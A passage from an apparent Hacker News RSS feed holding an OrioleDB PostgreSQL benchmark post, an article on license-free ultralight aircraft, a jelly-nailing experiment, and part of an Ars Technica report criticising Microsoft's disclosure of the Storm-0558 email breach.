<p>Further enhancements came with the implementation of Heap-Only Tuples (HOT) updates and microvacuum, both significant improvements that reduced the need for full table vacuums. However, despite these advancements, the VACUUM process still remained a resource-intensive operation. Furthermore, PostgreSQL tables remained prone to bloat, an issue that continues to plague many users today. This is the <a href="https://ottertune.com/blog/the-part-of-postgresql-we-hate-the-most/">part of PostgreSQL that the team at OtterTune hates the most</a>.</p>
<p>Despite these challenges, many organizations and developers continue to use and support PostgreSQL. Its robustness, extensibility, and strong community are just a few reasons why. For instance, <a href="https://ottertune.com/blog/yes-postgresql-has-problems-but-were-sticking-with-it/">OtterTune, despite acknowledging PostgreSQL’s problems, has decided to stick with it</a>. They explain their reasons in a separate blog post, highlighting the importance of considering the overall benefits and drawbacks of a system before making a decision.</p>
<h3 id="enter-orioledb-the-engine-of-the-future">Enter OrioleDB: The Engine of the Future</h3>
<p>OrioleDB is a groundbreaking new engine for PostgreSQL, developed with a primary goal: to save tables from bloat and eliminate the need for regular maintenance like VACUUM. It achieves this through the implementation of row-level and block-level undo logs, as well as automatic page merging.</p>
<p>The undo logs at the row and block level provide a more granular level of control, allowing for more efficient handling of data changes. The automatic page merging feature works tirelessly in the background to consolidate fragmented data, further enhancing the efficiency of the system.</p>
<figure><img src="https://www.orioledata.com/images/techniques.png" width="800px">
</figure>

<p>The figure above illustrates this techniques. Row-level undo log allows in-place updates. Block-level undo log allows to evict tuples, which are deleted but visible to some transactions, from the primary storage leaving more space for new tuples. Automatic merge of sparse pages saves tables and indexes from bloat after many deletes.</p>
<p>The implementation of these features in OrioleDB results in a system that requires less manual intervention, consumes fewer resources, and is less prone to table bloat. This promises a significant improvement in the performance and user experience of PostgreSQL.</p>
<h3 id="benchmarks">Benchmarks</h3>
<p>The following synthetic benchmark can illustrate the OrioleDB advantages of the above as well as some others.  The following initialization script creates a table and 5 indexes on it.</p>
<div><pre tabindex="0"><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> test (
    id integer <span>primary</span> <span>key</span>,
    value1 float8 <span>not</span> <span>null</span>,
    value2 float8 <span>not</span> <span>null</span>,
    value3 float8 <span>not</span> <span>null</span>,
    value4 float8 <span>not</span> <span>null</span>,
    ts <span>timestamp</span> <span>not</span> <span>null</span>
);

<span>CREATE</span> <span>INDEX</span> test_value1_idx <span>ON</span> test (value1);
<span>CREATE</span> <span>INDEX</span> test_value2_idx <span>ON</span> test (value2);
<span>CREATE</span> <span>INDEX</span> test_value3_idx <span>ON</span> test (value3);
<span>CREATE</span> <span>INDEX</span> test_value4_idx <span>ON</span> test (value4);
<span>CREATE</span> <span>INDEX</span> test_ts_idx <span>ON</span> test (ts);
</code></pre></div><p>The pgbench script is given below.  It’s an upsert that performs sparse updates of the one of indexes on conflict.  The sparse update causes this index to bloat when using regular heap PostgreSQL tables.</p>
<div><pre tabindex="0"><code data-lang="sql"><span>\</span><span>set</span> id random(<span>1</span>, <span>10000000</span>)
<span>INSERT</span> <span>INTO</span> test <span>VALUES</span>(:id, random(), random(), random(), random(), now() <span>-</span> random() <span>*</span> random() <span>*</span> <span>1800</span> <span>*</span> interval <span>'1 second'</span>)
<span>ON</span> CONFLICT (id) <span>DO</span> <span>UPDATE</span> <span>SET</span> ts <span>=</span> now();
</code></pre></div><p>This benchmark illustrates the following advantages of OrioleDB design.</p>
<ol>
<li>Thanks to undo log and in-place updates, OrioleDB needs to update only one index, whose value has been changed.  With the PostgreSQL heap engine, the update of a single indexed field disables HOT, so all indexes get updated.</li>
<li>Automatic page merge saves sparse index from bloat.  Sparse pages are automatically merged.</li>
<li>Row-level WAL takes much less space than block-level WAL.  That saves IOPS on WAL writing.</li>
</ol>
<p>See the results of the benchmark on the graphs below.</p>
<figure><img src="https://www.orioledata.com/images/bloat.png" width="800px">
</figure>

<p>As the cumulative result of the improvements discussed above, OrioleDB provides:</p>
<ul>
<li><strong>5X higher TPS</strong>,</li>
<li><strong>2.3X less CPU load per transaction</strong>,</li>
<li><strong>22X less IOPS per transaction</strong>,</li>
<li><strong>No table and index bloat</strong>.</li>
</ul>
<h3 id="embrace-the-future-try-orioledb-today">Embrace the Future: Try OrioleDB Today</h3>
<p>With the introduction of OrioleDB, the PostgreSQL community stands on the brink of a new era where the haunting specter of VACUUM is a thing of the past. This novel engine offers a compelling solution to one of PostgreSQL’s longest-standing challenges, promising users increased efficiency and fewer maintenance headaches.</p>
<p>So why wait? <a href="https://github.com/orioledb/orioledb">Visit our github</a> and try OrioleDB today and join the revolution to a more streamlined, efficient, and VACUUM-free PostgreSQL experience.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[What planes can you fly without a pilot’s license? (149 pts)]]></title>
            <link>https://pilotinstitute.com/flying-without-a-license/</link>
            <guid>36740400</guid>
            <pubDate>Sat, 15 Jul 2023 19:57:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pilotinstitute.com/flying-without-a-license/">https://pilotinstitute.com/flying-without-a-license/</a>, See on <a href="https://news.ycombinator.com/item?id=36740400">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>Flying is expensive and cost-prohibitive for most people who are not willing or unable to invest the time and money into obtaining a <a href="https://pilotinstitute.com/non-us-citizen-pilot-license/" target="_blank" rel="noreferrer noopener">pilot’s license</a>. However, there are still some options available to those who want to experience the thrill of flying without having to go through the long and expensive process of obtaining a license.</p>
<p><strong>Aircraft under the FAA’s 14 CFR Part 103 ultralight category does not require a <a href="https://pilotinstitute.com/pilot-license-benefits/" target="_blank" rel="noreferrer noopener">pilot’s license</a> to fly. There are helicopters, fixed-wing planes, and gliders that fall under this category that can be flown without a license, but you will require additional training to fly them safely. A pilot’s license is necessary to fly larger aircraft.</strong> </p>
<p>Let’s explore how you can take to the skies without a pilot’s license for a fraction of the cost!</p>

<p>You can fly certain planes without a pilot’s license.</p>
<p>Although you typically need a license to fly an aircraft, there are some exceptions for smaller, lighter aircraft. Most planes that don’t require a license to fly are small, single-seat aircraft with small engines.</p>
<p>Unlike aircraft that need a licensed pilot, these planes can be piloted without any certification because they are easy to fly, stay close to the ground, take off and land slowly, and, perhaps most importantly, don’t carry passengers. </p>
<p>Remember that if you try to fly an aircraft that requires a license to operate, you’ll find yourself in significant legal trouble.</p>
<h2>How to Fly a Plane without a License</h2>
<p>According to 14 CFR Part 103.1 (FAR 103), you may only fly an aircraft without a license according to the following conditions:</p>
<ul>
<li>The aircraft has one seat (no passengers allowed).</li>
<li>The aircraft may only be flown for recreational or sports purposes (no commercial operations).</li>
<li>The aircraft must weigh less than 155 pounds if it is not powered (it has no engine).</li>
<li>The aircraft must weigh less than 254 pounds (when empty) if it is powered (has an engine).</li>
<li>The aircraft must have a fuel capacity of no more than 5 U.S. gallons.</li>
<li>The aircraft must not be able to exceed 55 knots at full power in level flight.</li>
<li>The aircraft’s stall speed must not exceed 24 knots (power-off).</li>
</ul>
<p>Practically speaking, this means that you can only fly small planes by yourself at limited speeds and only if you’re a recreational flyer.</p>
<p>You don’t need a license to operate these aircraft because they’re easy enough to fly that the Federal Aviation Administration (FAA) doesn’t see the need to regulate them.</p>
<p>In certain areas, the law requires extra professional training before flying these types of aircraft. However, you won’t need a pilot’s license to operate them. </p>
<p>One of the main benefits of flying planes that meet these criteria is that you can experience flight without spending money on expensive flying lessons or ground school.</p>
<h2>Planes You Can Fly Without a Pilot’s License</h2>
<p>Let’s look at popular ultralight aircraft that do not require a pilot’s license to fly.</p>
<h3>Phantom X1</h3>
<figure><img decoding="async" loading="lazy" width="1024" height="567" src="https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-1024x567.jpg" alt="Phantom X1" srcset="https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-1024x567.jpg 1024w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-300x166.jpg 300w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-768x426.jpg 768w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-540x299.jpg 540w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-494x274.jpg 494w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-274x152.jpg 274w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-325x180.jpg 325w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1.jpg 1377w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
<p>The Phantom X1 is a tractor-configuration (i.e., front engine), high-wing, ultralight aircraft. Over 2000 Phantom X1 aircraft have been built since 2000, making it one of the most popular Part 103 ultralight aircraft in production today.</p>
<p>The 1980s design has proved popular and versatile, with many variants of the X1 produced, such as the X1E, X2, and Phantom I series.</p>
<p>The Phantom X1 features significant maneuverability and was initially designed as an aerobatic training aircraft. It was not marketed as an aerobatic aircraft due to legal considerations.</p>
<p>The factory options include brakes, a complete airframe parachute, and various Rotax engines from 40 to 64 hp (30 to 48 kW). The manufacturer estimates that it would take the average person 40 hours to assemble the Phantom X1 kit. </p>
<p>The best part is the Phantom’s attractive price tag. You can purchase a fully-built Phantom X1 for around $14,000.</p>
<h3>Aerolite 103</h3>
<figure><img decoding="async" loading="lazy" width="1024" height="700" src="https://pilotinstitute.com/wp-content/uploads/2022/12/Aerolite-103.jpg" alt="Aerolite 103" srcset="https://pilotinstitute.com/wp-content/uploads/2022/12/Aerolite-103.jpg 1024w, https://pilotinstitute.com/wp-content/uploads/2022/12/Aerolite-103-300x205.jpg 300w, https://pilotinstitute.com/wp-content/uploads/2022/12/Aerolite-103-768x525.jpg 768w, https://pilotinstitute.com/wp-content/uploads/2022/12/Aerolite-103-540x369.jpg 540w, https://pilotinstitute.com/wp-content/uploads/2022/12/Aerolite-103-481x329.jpg 481w, https://pilotinstitute.com/wp-content/uploads/2022/12/Aerolite-103-274x187.jpg 274w, https://pilotinstitute.com/wp-content/uploads/2022/12/Aerolite-103-263x180.jpg 263w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Image from <a href="https://commons.wikimedia.org/wiki/User:FlugKerl2">FlugKerl2</a></figcaption></figure>
<p>The Aerolite 103 is a single-seat, fixed-wing ultralight with an endurance of 2 hours.</p>
<p>The aircraft was updated and production resumed in 2013 after the company when out of business in 2005. </p>
<p>The Aerolite 103 can be purchased for around $19,000 fully assembled.</p>
<h3>Hummel Ultracruiser</h3>
<figure><img decoding="async" loading="lazy" width="900" height="677" src="https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser.jpeg" alt="" srcset="https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser.jpeg 900w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-300x226.jpeg 300w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-768x578.jpeg 768w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-540x406.jpeg 540w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-437x329.jpeg 437w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-274x206.jpeg 274w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-239x180.jpeg 239w" sizes="(max-width: 900px) 100vw, 900px"></figure>

<p>The Hummel Ultracruiser (also known as the Ultra Cruiser and UltraCruiser) is an all-metal ultralight aircraft fully compliant with FAR 104. </p>
<p>It is the only all-metal ultralight aircraft, and over 100 have been built since 2001.</p>
<h3>Mosquito XEL</h3>
<figure><img decoding="async" loading="lazy" width="900" height="550" src="https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL.jpg" alt="" srcset="https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL.jpg 900w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-300x183.jpg 300w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-768x469.jpg 768w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-540x330.jpg 540w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-494x302.jpg 494w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-274x167.jpg 274w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-295x180.jpg 295w" sizes="(max-width: 900px) 100vw, 900px"><figcaption>Image from <a href="https://commons.wikimedia.org/wiki/User:FlugKerl2">FlugKerl2</a></figcaption></figure>
<p>The mosquito XEL is a single-seat helicopter that doesn’t require a license to fly! It has an endurance of 1 hour and is equipped with floats. </p>
<p>It is more expensive than its fixed-wing ultralight counterparts at $53,000 fully built.</p>
<h2>What to Look for When Buying an Ultralight Aircraft</h2>
<p>When buying an ultralight aircraft, you should primarily focus on the empty weight, fuel capacity, and speed. There are many great options available in this category.</p>
<p>Because some manufacturers might falsely claim that their aircraft are Part 103 compliant, potential buyers need to be aware of these requirements. </p>
<p>The aircraft owner is responsible for ensuring the plane meets all FAA regulations. The penalties can be severe if an inspector finds that the aircraft does not comply with these regulations.</p>
<h2>What Happens If You Fly a Plane without a Pilot’s License?</h2>
<p>You could face severe penalties if you fly a plane that doesn’t meet the Part 103 Ultralight category requirements.</p>
<p>Depending on how aware you were of the transgression, you could even face prison time.</p>
<p>If you fly a plane without a license, the legal consequences can be up to $250,000 in fines and three years in prison. </p>
<p>If you cause injury or destruction to property, your punishment could be even more severe.</p>
<h2>Conclusion</h2>
<p>If you’re looking for a great way to get into aviation without breaking the bank, ultralight aircraft are definitely worth checking out. In addition to being relatively affordable, they don’t require a pilot’s license, and they’re also incredibly fun and easy to fly. </p>
<p>So whether you’re just getting started in aviation or you’ve been flying for years, ultralights are a great option that’s sure to provide plenty of enjoyment.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Metaculus (103 pts)]]></title>
            <link>https://www.metaculus.com/home/</link>
            <guid>36740385</guid>
            <pubDate>Sat, 15 Jul 2023 19:56:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.metaculus.com/home/">https://www.metaculus.com/home/</a>, See on <a href="https://news.ycombinator.com/item?id=36740385">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    
      <div>
        <p><a href="https://www.metaculus.com/help/guidelines/">Guidelines</a>
        <a href="https://www.metaculus.com/privacy-policy/">Privacy Policy</a>
        <a href="https://www.metaculus.com/terms-of-use/">Terms of Use</a>
      </p></div>
    

    <form action="/i18n/set-language/" method="post">
      

      
      
    </form>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nailing jelly to a wall: is it possible? (2007) (132 pts)]]></title>
            <link>https://greem.co.uk/otherbits/jelly.html</link>
            <guid>36740357</guid>
            <pubDate>Sat, 15 Jul 2023 19:53:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://greem.co.uk/otherbits/jelly.html">https://greem.co.uk/otherbits/jelly.html</a>, See on <a href="https://news.ycombinator.com/item?id=36740357">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>
We've all heard the old saying "it's like nailing jelly to a wall" to describe
a task that is very difficult or impossible. But is our view of the difficulty
of this task justified? Has anybody actually tried nailing jelly to a wall? In
this experiment I attempt to establish, one way or the other, the validity of
the old proverb.
</p><div>

<h2>Materials</h2>
<p>
I sourced the following materials from Sainsbury's and Focus.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/materials.jpg" alt="Hammer, nails, plank, jelly">
</p>
<p>
They are: a 16oz claw hammer, a 200g pack of 3" (75mm) round wire nails, a
selection of 135g packs of Hartley's jelly cubes, and a plank of wood,
dimensions 850x200x18mm (approx. 33½"x7¾"x¾"). The plank of
wood will play the part of the "wall". The type of wood, and its exact
dimensions, are not important.
</p>
<p>
The length of the nails is important. Specifically, the nails should be longer
than the depth of the bowl intended for use as the jelly mould. This is to
enable the nail to go right through the finished jelly and into the wall without
the nail first disapparing into the jelly.
</p>
<p>
The picture below shows the proposed jelly mould (an ordinary dessert
bowl) and one of the nails next to it for comparison purposes.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/bowl_nail.jpg" alt="Nail should be longer than bowl depth">
</p>
<hr>

<h2>A first attempt</h2>
<p>
A box of jelly, as purchased from the supermarket, contains twelve joined
"cubes". The orange flavour is shown below. This is "concentrated" or "neat"
jelly; the idea is that water is added to produce actual jelly. Of course,
these cubes are much more viscous than the diluted mixture produced by adding
water. Therefore, it should be easier to nail the concentrated cubes to the
wall than the actual jelly.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/orange_cubes.jpg" alt="Orange jelly cubes">
</p>
<p>
In fact, the jelly didn't even need a nail to stay on the wall. It just stuck
there. For good measure, I drove a nail through it. The jelly held in
place.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_stuck_to_wall.jpg" alt="Jelly stuck to the wall">
<img src="https://greem.co.uk/otherbits/jellypics/orange_jelly_nailed_to_wall.jpg" alt="Orange jelly nailed to the wall">
</p>
<p>
This is called "cheating".
</p>
<hr>
<h2>Making the jelly</h2>
<p>
My first attempt being somewhat against the spirit of the proverb, I decided
to repeat the experiment with proper jelly. The procedure for making jelly from
the jelly cubes is documented on the reverse of the jelly boxes; a summary is
given here.
</p>
<p>
The picture below shows the equipment required: some jelly cubes (lime this
time), a measuring jug, and some boiling water.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_prep.jpg" alt="Jelly, jug, kettle">
</p>
<p>
Do not eat any of the neat jelly cubes, no matter how nice they look. They're
incredibly sweet and probably addictive; if you eat them all you won't have
any left for the experiment.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_cubes_full.jpg" alt="Jelly cubes before I've
eaten some">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_cubes_eaten.jpg" alt="Jelly cubes after I've
eaten some">
</p>

<p>
Pour half a pint (284ml) of boiling water into a jug, and add the cubes. Stab
the cubes indiscriminately until they've all dissolved. Then add another half
pint of cold water, so the jug contains a pint (568ml) of jelly mix.
</p>
<p>
Given that the intention is that this jelly be nailed to a wall, we might
intuitively get better results if we add less water than required, in order to
give a thicker and presumably sturdier mix. However, in this experiment the
jelly will be prepared according to the instructions on the packet to ensure a
fair test.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/stab_cubes.jpg" alt="Stab the cubes until they've dissolved.">
<img src="https://greem.co.uk/otherbits/jellypics/jug_full.jpg" alt="Full jug">
</p>

<p>
Pour the jelly mix into whatever is being used for the jelly mould. In this
case, as mentioned before, we are using a simple dessert bowl. The only
restriction on the type of mould used is that its depth should be less than the
length of the nails.
</p>
<p>
If you reproduce this experiment, you will probably find that there is an
irritatingly small amount of jelly mixture left over in the jug once the mould
is full. Pour this footling amount of jelly into a glass, and place it in the
fridge alongside the bowl. For maximum confusion, don't tell any of your
housemates about it.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_in_bowl.jpg" alt="Jelly in bowl, and some left over in jug">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_in_fridge.jpg" alt="Jelly in fridge">
</p>
<p>
Finally, leave the jelly to set overnight.
</p>
<hr>
<h2>Nailing it to a wall</h2>
<p>
When the jelly has set, cover it with a plate, upturn the entire arrangement,
and carefully lift the bowl off the jelly. Then realise that the jelly is still
stuck to the bowl. Hit the bowl with a spoon a few times (to no avail) before
attacking the edges of the jelly with a thin sharp knife to loosen it.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_set.jpg" alt="Jelly on a plate">
</p>
<p>
The logical next step would be to pick up the jelly and nail it to some surface
perpendicular to the floor. Unfortunately, the first of these steps was
impossible; trying to pick up the jelly with bare hands resulted in its
partial disintegration. So, I opted for a compromise; I got the jelly back in
the bowl, and upturned it directly onto the plank, while it was horizontal.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_hand.jpg" alt="Can't pick up the jelly!">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_in_bowl_above_plank.jpg" alt="Putting the jelly on the plank">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_on_plank.jpg" alt="Jelly on the plank">
</p>
<p>
With the plank horizontal, I drove a nail through the centre of the jelly and
into the plank.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/nailing_jelly_to_the_wall.jpg" alt="Me nailing jelly to the plank">
</p>
<p>
I then added a few more nails to hold the jelly in place. Unfortunately, even
with nine nails in it, the jelly was starting to break around the nails when
the plank was tilted.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_five_nails.jpg" alt="Jelly with five nails in it">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_nine_nails.jpg" alt="Jelly with nine nails in it">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_nine_nails_closeup.jpg" alt="Close-up of jelly with nine nails in it">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_nine_nails_breaking.jpg" alt="Jelly with nine nails in it, falling to bits">
</p>
<p>
Seeing nothing better to do, I added three more nails at strategic points. When
the plank was tilted, half the jelly broke off completely and fell to the floor.
The weak points seemed to be near the nails.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_twelve_nails.jpg" alt="Jelly with twelve nails in it">
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_half_fallen_off.jpg" alt="Jelly half fallen off">
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_gloop.jpg" alt="Jelly half fallen off again">
</p>
<p>
The jelly's structural integrity now having been seriously compromised, the rest
of the jelly followed about half a minute later. This attempt at nailing jelly
to a wall had therefore resulted in quite a convincing failure.
</p>
<hr>
<h2>But wait...</h2>
<p>
I suddenly remembered that I had more jelly. The glass into which I poured the
excess from the jug was still sitting in the fridge. I retrieved it and
extricated the jelly. Perhaps a smaller amount of jelly would nail to the wall
easier?
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_and_glass.jpg" alt="The jelly from the glass">
</p>
<p>
Taking no chances, I not only nailed the jelly to the plank using five nails,
but also added a crescent of eight nails below the jelly to catch any wayward
lumps.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_nailed_1.jpg" alt="Small piece of jelly nailed to the wall">
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_nailed_2.jpg" alt="Small piece of jelly nailed to the wall">
</p>
<p>
This worked for approximately half a minute. Unfortunately, although the jelly
that fell off was briefly caught in the crescent arrangement of nails, it fell
through the gaps after a small amount of time.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_breaking_1.jpg" alt="Small piece of jelly breaking up">
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_breaking_2.jpg" alt="Small piece of jelly breaking up">
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_breaking_3.jpg" alt="Small piece of jelly breaking up">
</p>
<p>
Before long, there were only trace amounts of jelly left on the wall.
</p>
<hr>
<h2>Conclusion</h2>
<p>
Given some jelly mixed according to standard procedures and a vertical wall, it
is not possible to nail the former to the latter and have it stay there for any
significant amount of time. Furthermore, these experiments were conducted by
nailing the jelly to a horizontal surface which was then gradually tilted.
Nailing jelly to a wall while the wall is vertical is an intractable problem in
itself due to the difficulty in picking up jelly with the hands without it
disintegrating.
</p>
<p>
Even using many nails to construct a receptacle for the purpose of catching the
jelly, which is not technically "nailing it to the wall", resulted in failure.
This was because the gaps between the nails afford to the jelly an easy means of
egress from the receptacle.
</p>
<p>
Further research into the area might involve the nailing to the wall of a
stronger jelly mix. Alternatively, the "wall" could be placed, nails first, into
the jelly while it's setting, to allow the jelly to set around the nails. Then
in the morning the bowl can be removed, leaving the jelly nailed to the wall.
</p>
<p>
The old proverb, then, is justified, and the reader may say that an impossible
or near-impossible task is "like nailing jelly to the wall" safe in the
knowledge that the assertion has some scientific evidence to corroborate it.
</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft takes pains to obscure role in 0-days that caused email breach (192 pts)]]></title>
            <link>https://arstechnica.com/security/2023/07/microsoft-takes-pains-to-obscure-role-in-0-days-that-caused-email-breach/</link>
            <guid>36740133</guid>
            <pubDate>Sat, 15 Jul 2023 19:27:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/security/2023/07/microsoft-takes-pains-to-obscure-role-in-0-days-that-caused-email-breach/">https://arstechnica.com/security/2023/07/microsoft-takes-pains-to-obscure-role-in-0-days-that-caused-email-breach/</a>, See on <a href="https://news.ycombinator.com/item?id=36740133">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <h4>
      CYA    —
</h4>
            
            <h2 itemprop="description">Critics also decry Microsoft's "pay-to-play" monitoring that detected intrusions.</h2>
                    </div><div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/07/microsoft-exchange-azure-hiding-800x450.jpg" alt="Microsoft takes pains to obscure role in 0-days that caused email breach">
      <figcaption><p>Getty Images | Aurich Lawson</p></figcaption>  </figure>

  




<!-- cache hit 1:single/related:fbec121f1dc90d41de375d0c8b12a0f2 --><!-- empty -->
<p>On Friday, Microsoft attempted to explain the cause of a breach that gave hackers working for the Chinese government access to the email accounts of 25 organizations—reportedly including the US Departments of State and Commerce and other sensitive organizations.</p>
<p>In a <a href="https://www.microsoft.com/en-us/security/blog/2023/07/14/analysis-of-storm-0558-techniques-for-unauthorized-email-access/">post on Friday</a>, the company indicated that the compromise resulted from three exploited vulnerabilities in either its Exchange Online email service or <a href="https://azure.microsoft.com/en-us/products/active-directory/">Azure Active Directory</a>, an identity service that manages single sign-on and multifactor authentication for large organizations. Microsoft’s Threat Intelligence team said that Storm-0558, a China-based hacking outfit that conducts espionage on behalf of that country’s government, exploited them starting on May 15. Microsoft drove out the attackers on June 16 after a customer tipped off company researchers of the intrusion.</p>
<h2>Above all else: Avoid the Z-word</h2>
<p>In standard parlance among security professionals, this means that Storm-0558 exploited zero-days in the Microsoft cloud services. A “zero-day” is a vulnerability that is known to or exploited by outsiders before the vendor has a patch for it. “Exploit” means using code or other means to trigger a vulnerability in a way that causes harm to the vendor or others.</p>
<p>While both conditions are clearly met in the Storm-0558 intrusion, Friday’s post and <a href="https://msrc.microsoft.com/blog/2023/07/microsoft-mitigates-china-based-threat-actor-storm-0558-targeting-of-customer-email/">two</a> <a href="https://blogs.microsoft.com/on-the-issues/2023/07/11/mitigation-china-based-threat-actor/">others</a> Microsoft published Tuesday, bend over backward to avoid the words “vulnerability” or “zero-day.” Instead, the company uses considerably more amorphous terms such as “issue,” “error,” and “flaw” when attempting to explain how nation-state hackers tracked the email accounts of some of the company's biggest customers.</p>                                            
                                                        
<p>“In-depth analysis of the Exchange Online activity discovered that in fact the actor was forging Azure AD tokens using an acquired Microsoft account (MSA) consumer signing key,” Microsoft researchers wrote Friday. “This was made possible by a validation error in Microsoft code.”</p>
<p>Later in the post, the researchers said that Storm-0558 acquired an inactive signing key used for consumer cloud accounts and somehow managed to use it to forge tokens for Azure AD, a supposedly fortified cloud service that, in effect, stores the keys that thousands of organizations use to manage logins for accounts on both their internal networks and cloud-based ones.</p>
<p>“The method by which the actor acquired the key is a matter of ongoing investigation,” the post stated. “Though the key was intended only for MSA accounts, a validation issue allowed this key to be trusted for signing Azure AD tokens.”</p>
<p>Two paragraphs later, Microsoft said that Storm-0558 used the forged token to gain access to Exchange email accounts through a programming interface for Outlook Web Access (OWA). The researchers wrote:</p>
<blockquote><p>Once authenticated through a legitimate client flow leveraging the forged token, the threat actor accessed the OWA API to retrieve a token for Exchange Online from the GetAccessTokenForResource API used by OWA. The actor was able to obtain new access tokens by presenting one previously issued from this API due to a design flaw. This flaw in the GetAccessTokenForResourceAPI has since been fixed to only accept tokens issued from Azure AD or MSA respectively. The actor used these tokens to retrieve mail messages from the OWA API.</p></blockquote>
<p>A plain-English summary of the event would seem to be: Microsoft has patched three vulnerabilities in its cloud service that were discovered after Storm-0558 exploited them to gain access to customer accounts. It would also be helpful if Microsoft provided a tracking designation under the CVE (Common Vulnerabilities and Exposures) system the way other cloud companies do. So why doesn’t Microsoft do the same?</p>                                            
                                                        
<p>“I don't think Microsoft ever acknowledges vulnerabilities in their cloud services (also there's no CVEs for cloud), and you don't say breach at Microsoft,” independent researcher Kevin Beaumont <a href="https://cyberplace.social/@GossiTheDog/110713723694545488">said on Mastodon</a>. “They did say ‘exploit’ in the original MSRC blog in relation to Microsoft's cloud services, and you exploit a vulnerability. So I think it's fair to say that, yes, they had vuln(s).”</p>

<p>Microsoft issued the following comment: "We don’t have any evidence that the actor exploited a 0day." Microsoft didn't elaborate. In one of the two posts published on Tuesday, Microsoft said: "The actor exploited a token validation issue to impersonate Azure AD users and gain access to enterprise mail." Ars has asked for a clarification of exactly what was exploited by the threat actor.</p>
<h2>Pay-to-play security</h2>
<p>Besides being opaque about the root cause of the breach and its own role in it, Microsoft is under fire for withholding details that some of the victims could have used to detect the intrusion, something critics have called “pay-to-play security.” <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-193a">According to</a> the US Cybersecurity and Information Security Agency, one federal agency that was breached by Storm-0558, it discovered the intrusion through audit logs that track logins and other important events affecting customers’ Microsoft cloud events.</p>
<p>Microsoft, however, requires customers to <a href="https://learn.microsoft.com/en-US/microsoft-365/admin/manage/assign-licenses-to-users?view=o365-worldwide">pay an additional fee</a> to access these records. The cost for an “E5” enterprise license allowing such access is $57 per month per user, compared to an E3 license cost of $36 per month per customer.</p>
<p>“The fact that Microsoft only allows those who pay the extra money for E5 licensing to see the relevant log files is, well, something…” Will Dorman, senior principal analyst at Analygence, said in an interview. “If you're not an E5-paying customer, you lose the ability to see that you were compromised.”</p>
